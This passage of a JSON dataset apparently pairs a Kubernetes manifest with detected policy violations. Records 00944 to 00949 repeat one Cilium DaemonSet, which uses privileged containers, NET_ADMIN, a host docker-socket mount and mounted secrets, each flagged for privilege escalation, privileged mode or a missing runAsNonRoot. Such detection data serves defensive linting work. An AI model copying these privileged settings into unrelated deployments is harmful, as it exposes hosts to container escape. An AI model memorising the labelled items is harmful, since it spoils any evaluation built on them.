    "violation_text": "container \"cilium-agent\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "00944",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"clean-cilium-state\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "00945",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"cilium-agent\" is privileged"
  },
  {
    "id": "00946",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"clean-cilium-state\" is privileged"
  },
  {
    "id": "00947",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cilium-agent\" is not set to runAsNonRoot"
  },
  {
    "id": "00948",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"clean-cilium-state\" is not set to runAsNonRoot"
  },
  {
    "id": "00949",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        